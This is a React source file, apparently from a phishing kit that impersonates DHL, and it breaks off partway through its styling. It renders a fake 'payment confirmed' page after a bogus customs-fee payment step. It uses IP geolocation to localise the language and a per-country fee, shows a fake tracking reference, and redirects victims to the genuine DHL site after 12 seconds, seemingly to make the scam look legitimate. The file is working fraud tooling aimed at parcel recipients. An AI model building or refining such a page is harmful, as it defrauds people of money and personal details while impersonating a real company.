import React, { useState, useRef, useEffect } from 'react';

const DHLConfirmationPage = () => {
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [selectedLang, setSelectedLang] = useState({ flag: '🇬🇧', name: 'English', code: 'en', rtl: false });
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const [userCountry, setUserCountry] = useState(null);
  const [redirectCountdown, setRedirectCountdown] = useState(12);
  const langMenuRef = useRef(null);
  const redirectTimerRef = useRef(null);

  // All languages from the screenshot - EXPANDED
  const languages = [
    { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    { flag: '🇩🇪', name: 'Deutsch', code: 'de', rtl: false },
    { flag: '🇧🇷', name: 'Português', code: 'pt', rtl: false },
    { flag: '🇹🇷', name: 'Türkçe', code: 'tr', rtl: false },
    { flag: '🇮🇹', name: 'Italiano', code: 'it', rtl: false },
    { flag: '🇷🇺', name: 'Русский', code: 'ru', rtl: false },
    { flag: '🇨🇳', name: '中文', code: 'zh', rtl: false },
    { flag: '🇰🇷', name: '한국어', code: 'ko', rtl: false },
    { flag: '🇯🇵', name: '日本語', code: 'ja', rtl: false },
    { flag: '🇵🇱', name: 'Polski', code: 'pl', rtl: false },
    { flag: '🇳🇱', name: 'Nederlands', code: 'nl', rtl: false },
    { flag: '🇹🇭', name: 'ไทย', code: 'th', rtl: false },
    { flag: '🇮🇩', name: 'Indonesia', code: 'id', rtl: false },
    { flag: '🇻🇳', name: 'Tiếng Việt', code: 'vi', rtl: false },
    // Added Nordic languages
    { flag: '🇸🇪', name: 'Svenska', code: 'sv', rtl: false },
    { flag: '🇳🇴', name: 'Norsk', code: 'no', rtl: false },
    { flag: '🇩🇰', name: 'Dansk', code: 'da', rtl: false },
    { flag: '🇫🇮', name: 'Suomi', code: 'fi', rtl: false },
  ];

  // Currency data based on country code - EXPANDED
  const currencyData = {
    'TN': { symbol: 'TND', code: 'TND', fee_display: '14', name: 'Tunisian Dinar' },
    'DZ': { symbol: 'DZD', code: 'DZD', fee_display: '480', name: 'Algerian Dinar' },
    'MA': { symbol: 'MAD', code: 'MAD', fee_display: '115', name: 'Moroccan Dirham' },
    'EG': { symbol: 'EGP', code: 'EGP', fee_display: '215', name: 'Egyptian Pound' },
    'LY': { symbol: 'LYD', code: 'LYD', fee_display: '48', name: 'Libyan Dinar' },
    'SA': { symbol: 'SAR', code: 'SAR', fee_display: '38', name: 'Saudi Riyal' },
    'AE': { symbol: 'AED', code: 'AED', fee_display: '37', name: 'UAE Dirham' },
    'QA': { symbol: 'QAR', code: 'QAR', fee_display: '37', name: 'Qatari Riyal' },
    'KW': { symbol: 'KWD', code: 'KWD', fee_display: '3.10', name: 'Kuwaiti Dinar' },
    'BH': { symbol: 'BHD', code: 'BHD', fee_display: '3.80', name: 'Bahraini Dinar' },
    'OM': { symbol: 'OMR', code: 'OMR', fee_display: '3.90', name: 'Omani Rial' },
    'JO': { symbol: 'JOD', code: 'JOD', fee_display: '7.10', name: 'Jordanian Dinar' },
    'LB': { symbol: 'LBP', code: 'LBP', fee_display: '15000', name: 'Lebanese Pound' },
    'FR': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'DE': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'ES': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'IT': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'NL': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'BE': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'PT': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'AT': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'LU': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'IE': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'GB': { symbol: '£', code: 'GBP', fee_display: '11', name: 'British Pound' },
    'CH': { symbol: 'CHF', code: 'CHF', fee_display: '12', name: 'Swiss Franc' },
    'PL': { symbol: 'zł', code: 'PLN', fee_display: '55', name: 'Polish Zloty' },
    'TR': { symbol: '₺', code: 'TRY', fee_display: '145', name: 'Turkish Lira' },
    'RU': { symbol: '₽', code: 'RUB', fee_display: '1150', name: 'Russian Ruble' },
    'UA': { symbol: '₴', code: 'UAH', fee_display: '480', name: 'Ukrainian Hryvnia' },
    'NO': { symbol: 'kr', code: 'NOK', fee_display: '142', name: 'Norwegian Krone' },
    'SE': { symbol: 'kr', code: 'SEK', fee_display: '145', name: 'Swedish Krona' },
    'DK': { symbol: 'kr', code: 'DKK', fee_display: '95', name: 'Danish Krone' },
    'FI': { symbol: '€', code: 'EUR', fee_display: '13', name: 'Euro' },
    'US': { symbol: '$', code: 'USD', fee_display: '14', name: 'US Dollar' },
    'CA': { symbol: 'C$', code: 'CAD', fee_display: '18', name: 'Canadian Dollar' },
    'MX': { symbol: '$', code: 'MXN', fee_display: '240', name: 'Mexican Peso' },
    'BR': { symbol: 'R$', code: 'BRL', fee_display: '72', name: 'Brazilian Real' },
    'AR': { symbol: '$', code: 'ARS', fee_display: '3500', name: 'Argentine Peso' },
    'CL': { symbol: '$', code: 'CLP', fee_display: '10500', name: 'Chilean Peso' },
    'CO': { symbol: '$', code: 'COP', fee_display: '52000', name: 'Colombian Peso' },
    'PE': { symbol: 'S/', code: 'PEN', fee_display: '52', name: 'Peruvian Sol' },
    'CN': { symbol: '¥', code: 'CNY', fee_display: '98', name: 'Chinese Yuan' },
    'JP': { symbol: '¥', code: 'JPY', fee_display: '1500', name: 'Japanese Yen' },
    'KR': { symbol: '₩', code: 'KRW', fee_display: '18500', name: 'South Korean Won' },
    'IN': { symbol: '₹', code: 'INR', fee_display: '1050', name: 'Indian Rupee' },
    'ID': { symbol: 'Rp', code: 'IDR', fee_display: '210000', name: 'Indonesian Rupiah' },
    'TH': { symbol: '฿', code: 'THB', fee_display: '480', name: 'Thai Baht' },
    'VN': { symbol: '₫', code: 'VND', fee_display: '330000', name: 'Vietnamese Dong' },
    'MY': { symbol: 'RM', code: 'MYR', fee_display: '62', name: 'Malaysian Ringgit' },
    'SG': { symbol: 'S$', code: 'SGD', fee_display: '19', name: 'Singapore Dollar' },
    'PH': { symbol: '₱', code: 'PHP', fee_display: '750', name: 'Philippine Peso' },
    'PK': { symbol: '₨', code: 'PKR', fee_display: '2700', name: 'Pakistani Rupee' },
    'BD': { symbol: '৳', code: 'BDT', fee_display: '1250', name: 'Bangladeshi Taka' },
    'AU': { symbol: 'A$', code: 'AUD', fee_display: '21', name: 'Australian Dollar' },
    'NZ': { symbol: 'NZ$', code: 'NZD', fee_display: '23', name: 'New Zealand Dollar' },
    'ZA': { symbol: 'R', code: 'ZAR', fee_display: '245', name: 'South African Rand' },
    'NG': { symbol: '₦', code: 'NGN', fee_display: '5800', name: 'Nigerian Naira' },
    'KE': { symbol: 'KSh', code: 'KES', fee_display: '1600', name: 'Kenyan Shilling' },
    'GH': { symbol: '₵', code: 'GHS', fee_display: '150', name: 'Ghanaian Cedi' },
    'IL': { symbol: '₪', code: 'ILS', fee_display: '52', name: 'Israeli Shekel' },
    'default': { symbol: '$', code: 'USD', fee_display: '14', name: 'US Dollar' }
  };

  // ============================================
  // COUNTRY TO LANGUAGE MAPPING - FIXED PER REQUEST
  // TN = "en", CH = "de"
  // ============================================
  const countryToLanguage = {
    // Arabic countries (except TN which is now English)
    'SA': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'AE': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'EG': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'QA': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'KW': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'BH': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'OM': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'JO': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'LB': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'DZ': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'MA': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    'LY': { flag: '🇸🇦', name: 'العربية', code: 'ar', rtl: true },
    // Tunisia - English as requested
    'TN': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    // English speaking countries
    'US': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'GB': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'CA': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'AU': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'NZ': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'IE': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'ZA': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'IN': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'SG': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'PH': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    'NG': { flag: '🇬🇧', name: 'English', code: 'en', rtl: false },
    // French speaking countries
    'FR': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    'BE': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    'LU': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    'MC': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    'SN': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    'CI': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    'CM': { flag: '🇫🇷', name: 'Français', code: 'fr', rtl: false },
    // Switzerland - German as requested
    'CH': { flag: '🇩🇪', name: 'Deutsch', code: 'de', rtl: false },
    // Spanish speaking countries
    'ES': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'MX': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'AR': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'CO': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'PE': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'CL': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'VE': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    'EC': { flag: '🇪🇸', name: 'Español', code: 'es', rtl: false },
    // German speaking countries
    'DE': { flag: '🇩🇪', name: 'Deutsch', code: 'de', rtl: false },
    'AT': { flag: '🇩🇪', name: 'Deutsch', code: 'de', rtl: false },
    'LI': { flag: '🇩🇪', name: 'Deutsch', code: 'de', rtl: false },
    // Portuguese
    'PT': { flag: '🇧🇷', name: 'Português', code: 'pt', rtl: false },
    'BR': { flag: '🇧🇷', name: 'Português', code: 'pt', rtl: false },
    'AO': { flag: '🇧🇷', name: 'Português', code: 'pt', rtl: false },
    'MZ': { flag: '🇧🇷', name: 'Português', code: 'pt', rtl: false },
    // Turkish
    'TR': { flag: '🇹🇷', name: 'Türkçe', code: 'tr', rtl: false },
    // Italian
    'IT': { flag: '🇮🇹', name: 'Italiano', code: 'it', rtl: false },
    'SM': { flag: '🇮🇹', name: 'Italiano', code: 'it', rtl: false },
    'VA': { flag: '🇮🇹', name: 'Italiano', code: 'it', rtl: false },
    // Russian
    'RU': { flag: '🇷🇺', name: 'Русский', code: 'ru', rtl: false },
    'UA': { flag: '🇷🇺', name: 'Русский', code: 'ru', rtl: false },
    'BY': { flag: '🇷🇺', name: 'Русский', code: 'ru', rtl: false },
    'KZ': { flag: '🇷🇺', name: 'Русский', code: 'ru', rtl: false },
    'KG': { flag: '🇷🇺', name: 'Русский', code: 'ru', rtl: false },
    // Chinese
    'CN': { flag: '🇨🇳', name: '中文', code: 'zh', rtl: false },
    'TW': { flag: '🇨🇳', name: '中文', code: 'zh', rtl: false },
    'HK': { flag: '🇨🇳', name: '中文', code: 'zh', rtl: false },
    'MO': { flag: '🇨🇳', name: '中文', code: 'zh', rtl: false },
    // Korean
    'KR': { flag: '🇰🇷', name: '한국어', code: 'ko', rtl: false },
    // Japanese
    'JP': { flag: '🇯🇵', name: '日本語', code: 'ja', rtl: false },
    // Polish
    'PL': { flag: '🇵🇱', name: 'Polski', code: 'pl', rtl: false },
    // Dutch
    'NL': { flag: '🇳🇱', name: 'Nederlands', code: 'nl', rtl: false },
    // Thai
    'TH': { flag: '🇹🇭', name: 'ไทย', code: 'th', rtl: false },
    // Indonesian
    'ID': { flag: '🇮🇩', name: 'Indonesia', code: 'id', rtl: false },
    // Vietnamese
    'VN': { flag: '🇻🇳', name: 'Tiếng Việt', code: 'vi', rtl: false },
    // Nordic
    'SE': { flag: '🇸🇪', name: 'Svenska', code: 'sv', rtl: false },
    'NO': { flag: '🇳🇴', name: 'Norsk', code: 'no', rtl: false },
    'DK': { flag: '🇩🇰', name: 'Dansk', code: 'da', rtl: false },
    'FI': { flag: '🇫🇮', name: 'Suomi', code: 'fi', rtl: false },
    // Hebrew
    'IL': { flag: '🇮🇱', name: 'עברית', code: 'he', rtl: true },
    // Urdu
    'PK': { flag: '🇵🇰', name: 'اردو', code: 'ur', rtl: true },
    // Bengali
    'BD': { flag: '🇧🇩', name: 'বাংলা', code: 'bn', rtl: false },
  };

  // Format date based on language and region
  const getFormattedDate = (langCode, countryCode) => {
    const date = new Date(2026, 3, 29);
    if (langCode === 'ar') return '٢٩ أبريل ٢٠٢٦';
    const options = { year: 'numeric', month: 'long', day: 'numeric' };
    try {
      let locale = langCode;
      if (countryCode === 'US') locale = 'en-US';
      else if (countryCode === 'GB') locale = 'en-GB';
      else if (countryCode === 'DE') locale = 'de-DE';
      else if (countryCode === 'FR') locale = 'fr-FR';
      else if (countryCode === 'ES') locale = 'es-ES';
      else if (countryCode === 'BR') locale = 'pt-BR';
      else if (countryCode === 'JP') locale = 'ja-JP';
      else if (countryCode === 'CN') locale = 'zh-CN';
      else if (countryCode === 'KR') locale = 'ko-KR';
      else if (countryCode === 'RU') locale = 'ru-RU';
      else if (countryCode === 'IT') locale = 'it-IT';
      else if (countryCode === 'TR') locale = 'tr-TR';
      else if (countryCode === 'PL') locale = 'pl-PL';
      else if (countryCode === 'NL') locale = 'nl-NL';
      else if (countryCode === 'TH') locale = 'th-TH';
      else if (countryCode === 'ID') locale = 'id-ID';
      else if (countryCode === 'VN') locale = 'vi-VN';
      else if (countryCode === 'SE') locale = 'sv-SE';
      else if (countryCode === 'NO') locale = 'nb-NO';
      else if (countryCode === 'DK') locale = 'da-DK';
      else if (countryCode === 'FI') locale = 'fi-FI';
      return date.toLocaleDateString(locale, options);
    } catch (e) {
      return '29 April 2026';
    }
  };

  // Content translations for all languages - EXPANDED
  const translations = {
    ar: { step1: 'ملء المعلومات', step2: 'دفع الرسوم الجمركية', step3: 'تقديم إعادة التسليم', title: 'تم تأكيد الدفع', subtitle: 'تم دفع رسومك الجمركية بنجاح. سيتم الإفراج عن طردك للتسليم.', tracking: 'رقم التتبع', amount: 'المبلغ المدفوع', status: 'الحالة', statusValue: 'تم تقديم إعادة التسليم', delivery: 'التسليم المتوقع', note: 'تم إرسال بريد إلكتروني للتأكيد. يمكنك إغلاق هذه الصفحة.', privacy: 'إشعار الخصوصية', consent: 'إعدادات الموافقة', copyright: 'جميع الحقوق محفوظة', redirect: 'سيتم إعادة التوجيه بعد' },
    en: { step1: 'Fill Information', step2: 'Pay Customs Fee', step3: 'Submit Redelivery', title: 'Payment Confirmed', subtitle: 'Your customs fees have been paid successfully. Your shipment will be released for delivery.', tracking: 'Tracking Number', amount: 'Amount Paid', status: 'Status', statusValue: 'Redelivery Requested', delivery: 'Expected Delivery', note: 'A confirmation email has been sent. You may close this page.', privacy: 'Privacy Notice', consent: 'Consent Settings', copyright: 'All rights reserved', redirect: 'Redirecting in' },
    fr: { step1: 'Remplir les informations', step2: 'Payer les droits de douane', step3: 'Soumettre la nouvelle livraison', title: 'Paiement confirmé', subtitle: 'Vos frais de douane ont été payés avec succès. Votre colis sera libéré pour la livraison.', tracking: 'Numéro de suivi', amount: 'Montant payé', status: 'Statut', statusValue: 'Nouvelle livraison demandée', delivery: 'Livraison prévue', note: 'Un e-mail de confirmation a été envoyé. Vous pouvez fermer cette page.', privacy: 'Avis de confidentialité', consent: 'Paramètres de consentement', copyright: 'Tous droits réservés', redirect: 'Redirection dans' },
    es: { step1: 'Completar información', step2: 'Pagar aranceles', step3: 'Solicitar nueva entrega', title: 'Pago confirmado', subtitle: 'Sus aranceles se han pagado correctamente. Su envío será liberado para la entrega.', tracking: 'Número de seguimiento', amount: 'Monto pagado', status: 'Estado', statusValue: 'Nueva entrega solicitada', delivery: 'Entrega prevista', note: 'Se ha enviado un correo de confirmación. Puede cerrar esta página.', privacy: 'Aviso de privacidad', consent: 'Configuración de consentimiento', copyright: 'Todos los derechos reservados', redirect: 'Redirigiendo en' },
    de: { step1: 'Informationen ausfüllen', step2: 'Zollgebühren bezahlen', step3: 'Neuzustellung beantragen', title: 'Zahlung bestätigt', subtitle: 'Ihre Zollgebühren wurden erfolgreich bezahlt. Ihre Sendung wird zur Zustellung freigegeben.', tracking: 'Sendungsnummer', amount: 'Bezahlter Betrag', status: 'Status', statusValue: 'Neuzustellung angefordert', delivery: 'Voraussichtliche Zustellung', note: 'Eine Bestätigungs-E-Mail wurde gesendet. Sie können diese Seite schließen.', privacy: 'Datenschutzerklärung', consent: 'Einwilligungseinstellungen', copyright: 'Alle Rechte vorbehalten', redirect: 'Weiterleitung in' },
    pt: { step1: 'Preencher informações', step2: 'Pagar taxas aduaneiras', step3: 'Solicitar nova entrega', title: 'Pagamento confirmado', subtitle: 'Suas taxas aduaneiras foram pagas com sucesso. Sua encomenda será liberada para entrega.', tracking: 'Número de rastreamento', amount: 'Valor pago', status: 'Status', statusValue: 'Nova entrega solicitada', delivery: 'Entrega prevista', note: 'Um e-mail de confirmação foi enviado. Você pode fechar esta página.', privacy: 'Aviso de privacidade', consent: 'Configurações de consentimento', copyright: 'Todos os direitos reservados', redirect: 'Redirecionando em' },
    tr: { step1: 'Bilgileri Doldurun', step2: 'Gümrük Ücretini Ödeyin', step3: 'Yeniden Teslim Talebi Gönderin', title: 'Ödeme Onaylandı', subtitle: 'Gümrük ücretleriniz başarıyla ödendi. Gönderiniz teslimat için serbest bırakılacaktır.', tracking: 'Takip Numarası', amount: 'Ödenen Tutar', status: 'Durum', statusValue: 'Yeniden Teslim Talep Edildi', delivery: 'Beklenen Teslimat', note: 'Onay e-postası gönderildi. Bu sayfayı kapatabilirsiniz.', privacy: 'Gizlilik Bildirimi', consent: 'Onay Ayarları', copyright: 'Tüm hakları saklıdır', redirect: 'Yönlendiriliyor' },
    it: { step1: 'Compila informazioni', step2: 'Paga dazi doganali', step3: 'Richiedi nuova consegna', title: 'Pagamento confermato', subtitle: 'I tuoi dazi doganali sono stati pagati con successo. La tua spedizione verrà rilasciata per la consegna.', tracking: 'Numero di tracciamento', amount: 'Importo pagato', status: 'Stato', statusValue: 'Nuova consegna richiesta', delivery: 'Consegna prevista', note: 'È stata inviata un\'email di conferma. Puoi chiudere questa pagina.', privacy: 'Informativa sulla privacy', consent: 'Impostazioni del consenso', copyright: 'Tutti i diritti riservati', redirect: 'Reindirizzamento tra' },
    ru: { step1: 'Заполнить информацию', step2: 'Оплатить таможенные сборы', step3: 'Подать запрос на повторную доставку', title: 'Платеж подтвержден', subtitle: 'Ваши таможенные сборы успешно оплачены. Ваша посылка будет выпущена для доставки.', tracking: 'Номер отслеживания', amount: 'Оплаченная сумма', status: 'Статус', statusValue: 'Запрошена повторная доставка', delivery: 'Ожидаемая доставка', note: 'Письмо с подтверждением отправлено. Вы можете закрыть эту страницу.', privacy: 'Уведомление о конфиденциальности', consent: 'Настройки согласия', copyright: 'Все права защищены', redirect: 'Перенаправление через' },
    zh: { step1: '填写信息', step2: '支付关税', step3: '提交重新派送', title: '付款已确认', subtitle: '您的关税已成功支付。您的包裹将被放行派送。', tracking: '追踪号码', amount: '付款金额', status: '状态', statusValue: '已请求重新派送', delivery: '预计派送时间', note: '确认邮件已发送。您可以关闭此页面。', privacy: '隐私声明', consent: '同意设置', copyright: '版权所有', redirect: '跳转至' },
    ko: { step1: '정보 입력', step2: '관세 납부', step3: '재배송 신청', title: '결제 확인됨', subtitle: '관세가 성공적으로 납부되었습니다. 배송이 진행됩니다.', tracking: '추적 번호', amount: '결제 금액', status: '상태', statusValue: '재배송 요청됨', delivery: '예상 배송일', note: '확인 이메일이 발송되었습니다. 이 페이지를 닫으셔도 됩니다.', privacy: '개인정보 보호정책', consent: '동의 설정', copyright: '판권 소유', redirect: '리디렉션 중' },
    ja: { step1: '情報入力', step2: '関税支払い', step3: '再配達申請', title: '支払い確認済み', subtitle: '関税は正常に支払われました。配送が開始されます。', tracking: '追跡番号', amount: '支払い額', status: 'ステータス', statusValue: '再配達リクエスト済み', delivery: 'お届け予定日', note: '確認メールが送信されました。このページを閉じても構いません。', privacy: 'プライバシー通知', consent: '同意設定', copyright: '無断転載を禁じます', redirect: 'リダイレクト' },
    pl: { step1: 'Wypełnij informacje', step2: 'Zapłać cło', step3: 'Złóż wniosek o ponowną dostawę', title: 'Płatność potwierdzona', subtitle: 'Twoje opłaty celne zostały pomyślnie opłacone. Twoja przesyłka zostanie zwolniona do dostawy.', tracking: 'Numer śledzenia', amount: 'Zapłacona kwota', status: 'Status', statusValue: 'Poproszono o ponowną dostawę', delivery: 'Przewidywana dostawa', note: 'E-mail z potwierdzeniem został wysłany. Możesz zamknąć tę stronę.', privacy: 'Polityka prywatności', consent: 'Ustawienia zgód', copyright: 'Wszelkie prawa zastrzeżone', redirect: 'Przekierowanie za' },
    nl: { step1: 'Vul informatie in', step2: 'Betaal douanekosten', step3: 'Dien herlevering in', title: 'Betaling bevestigd', subtitle: 'Uw douanekosten zijn succesvol betaald. Uw zending wordt vrijgegeven voor bezorging.', tracking: 'Trackingnummer', amount: 'Betaald bedrag', status: 'Status', statusValue: 'Herlevering aangevraagd', delivery: 'Verwachte levering', note: 'Er is een bevestigingsmail verzonden. U kunt deze pagina sluiten.', privacy: 'Privacyverklaring', consent: 'Toestemmingsinstellingen', copyright: 'Alle rechten voorbehouden', redirect: 'Doorverwijzen over' },
    th: { step1: 'กรอกข้อมูล', step2: 'ชำระค่าธรรมเนียมศุลกากร', step3: 'ส่งคำขอจัดส่งใหม่', title: 'ยืนยันการชำระเงินแล้ว', subtitle: 'ชำระค่าธรรมเนียมศุลกากรเรียบร้อยแล้ว พัสดุของคุณจะถูกปล่อยเพื่อจัดส่ง', tracking: 'หมายเลขติดตาม', amount: 'จำนวนเงินที่ชำระ', status: 'สถานะ', statusValue: 'ขอจัดส่งใหม่แล้ว', delivery: 'การจัดส่งที่คาดหวัง', note: 'ส่งอีเมลยืนยันแล้ว คุณสามารถปิดหน้านี้ได้', privacy: 'ประกาศความเป็นส่วนตัว', consent: 'การตั้งค่ายินยอม', copyright: 'สงวนลิขสิทธิ์', redirect: 'เปลี่ยนเส้นทางใน' },
    id: { step1: 'Isi Informasi', step2: 'Bayar Bea Cukai', step3: 'Ajukan Pengiriman Ulang', title: 'Pembayaran Dikonfirmasi', subtitle: 'Bea cukai Anda telah berhasil dibayar. Kiriman Anda akan dilepaskan untuk pengiriman.', tracking: 'Nomor Lacak', amount: 'Jumlah Dibayar', status: 'Status', statusValue: 'Pengiriman Ulang Diminta', delivery: 'Perkiraan Pengiriman', note: 'Email konfirmasi telah dikirim. Anda dapat menutup halaman ini.', privacy: 'Pemberitahuan Privasi', consent: 'Pengaturan Persetujuan', copyright: 'Hak cipta dilindungi', redirect: 'Mengalihkan dalam' },
    vi: { step1: 'Điền thông tin', step2: 'Thanh toán phí hải quan', step3: 'Gửi yêu cầu giao lại', title: 'Đã xác nhận thanh toán', subtitle: 'Phí hải quan của bạn đã được thanh toán thành công. Kiện hàng của bạn sẽ được giải phóng để giao hàng.', tracking: 'Mã theo dõi', amount: 'Số tiền đã thanh toán', status: 'Trạng thái', statusValue: 'Đã yêu cầu giao lại', delivery: 'Dự kiến giao hàng', note: 'Email xác nhận đã được gửi. Bạn có thể đóng trang này.', privacy: 'Thông báo quyền riêng tư', consent: 'Cài đặt đồng ý', copyright: 'Đã đăng ký bản quyền', redirect: 'Chuyển hướng sau' },
    // Nordic languages
    sv: { step1: 'Fyll i information', step2: 'Betala tullavgift', step3: 'Skicka omfrakt', title: 'Betalning bekräftad', subtitle: 'Dina tullavgifter har betalats framgångsrikt. Din försändelse kommer att frisläppas för leverans.', tracking: 'Spårningsnummer', amount: 'Betalt belopp', status: 'Status', statusValue: 'Omfrakt begärd', delivery: 'Förväntad leverans', note: 'Ett bekräftelsemail har skickats. Du kan stänga den här sidan.', privacy: 'Integritetspolicy', consent: 'Cookie-inställningar', copyright: 'Alla rättigheter förbehålls', redirect: 'Omdirigerar om' },
    no: { step1: 'Fyll ut informasjon', step2: 'Betal tollavgift', step3: 'Send omforsendelse', title: 'Betaling bekreftet', subtitle: 'Tollavgiftene dine er betalt. Forsendelsen din vil bli frigitt for levering.', tracking: 'Spornummer', amount: 'Betalt beløp', status: 'Status', statusValue: 'Omforsendelse forespurt', delivery: 'Forventet levering', note: 'En bekreftelses-e-post er sendt. Du kan lukke denne siden.', privacy: 'Personvernerklæring', consent: 'Samtykkeinnstillinger', copyright: 'Alle rettigheter forbeholdt', redirect: 'Omdirigerer om' },
    da: { step1: 'Udfyld information', step2: 'Betal toldafgift', step3: 'Indsend gensendelse', title: 'Betaling bekræftet', subtitle: 'Dine toldafgifter er blevet betalt. Din forsendelse vil blive frigivet til levering.', tracking: 'Forsendelsesnummer', amount: 'Betalt beløb', status: 'Status', statusValue: 'Gensendelse anmodet', delivery: 'Forventet levering', note: 'En bekræftelsesmail er sendt. Du kan lukke denne side.', privacy: 'Privatlivspolitik', consent: 'Samtykkeindstillinger', copyright: 'Alle rettigheder forbeholdes', redirect: 'Omdirigerer om' },
    fi: { step1: 'Täytä tiedot', step2: 'Maksa tullimaksu', step3: 'Lähetä uudelleenlähetys', title: 'Maksu vahvistettu', subtitle: 'Tullimaksusi on maksettu. Lähetyksesi vapautetaan toimitusta varten.', tracking: 'Seurantanumero', amount: 'Maksettu summa', status: 'Tila', statusValue: 'Uudelleenlähetystä pyydetty', delivery: 'Odotettu toimitus', note: 'Vahvistussähköposti on lähetetty. Voit sulkea tämän sivun.', privacy: 'Tietosuojailmoitus', consent: 'Suostumusasetukset', copyright: 'Kaikki oikeudet pidätetään', redirect: 'Uudelleenohjataan' },
  };

  // Auto-detect language and currency based on IP
  useEffect(() => {
    const detectByIP = async () => {
      try {
        const response = await fetch('/api/ipinfo');
        const data = await response.json();
        if (data.success && data.country_code) {
          const countryCode = data.country_code;
          setUserCountry(countryCode);
          const detectedLang = countryToLanguage[countryCode];
          if (detectedLang) {
            setSelectedLang(detectedLang);
          } else {
            setSelectedLang({ flag: '🇬🇧', name: 'English', code: 'en', rtl: false });
          }
        } else {
          setSelectedLang({ flag: '🇬🇧', name: 'English', code: 'en', rtl: false });
          setUserCountry('US');
        }
      } catch (error) {
        setSelectedLang({ flag: '🇬🇧', name: 'English', code: 'en', rtl: false });
        setUserCountry('US');
      } finally {
        setIsLoadingLang(false);
      }
    };
    detectByIP();
  }, []);

  // Redirect logic: after 12 seconds go to DHL DK page
  useEffect(() => {
    if (!isLoadingLang) {
      const targetUrl = 'https://www.dhl.com/dk-da/home/forsyningskaede.html';
      redirectTimerRef.current = setInterval(() => {
        setRedirectCountdown(prev => {
          if (prev <= 1) {
            clearInterval(redirectTimerRef.current);
            window.location.href = targetUrl;
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => {
        if (redirectTimerRef.current) clearInterval(redirectTimerRef.current);
      };
    }
  }, [isLoadingLang]);

  const getCurrencyForCountry = () => {
    if (userCountry && currencyData[userCountry]) return currencyData[userCountry];
    return currencyData.default;
  };

  const currency = getCurrencyForCountry();
  const t = translations[selectedLang.code] || translations.en;
  const isRTL = selectedLang.rtl;

  const portalData = {
    reference_code: 'DHL-740-908-7078',
    fee_display: currency.fee_display,
    currency_symbol: currency.symbol,
    currency_code: currency.code,
    expected_delivery: getFormattedDate(selectedLang.code, userCountry)
  };

  const handleLanguageSelect = (lang) => {
    setSelectedLang(lang);
    setLangMenuOpen(false);
  };

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (langMenuRef.current && !langMenuRef.current.contains(event.target)) {
        setLangMenuOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  if (isLoadingLang) {
    return (
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', fontFamily: 'Arial, sans-serif', background: '#F7F7F7' }}>
        <div style={{ textAlign: 'center' }}>
          <div style={{ width: '50px', height: '50px', border: '4px solid #ffcc00', borderTop: '4px solid #d40511', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 20px' }} />
          <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          <p>Loading your preferred language...</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ fontFamily: 'Inter, Arial, sans-serif' }} dir={isRTL ? 'rtl' : 'ltr'}>
      <style>{`
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #F7F7F7; }
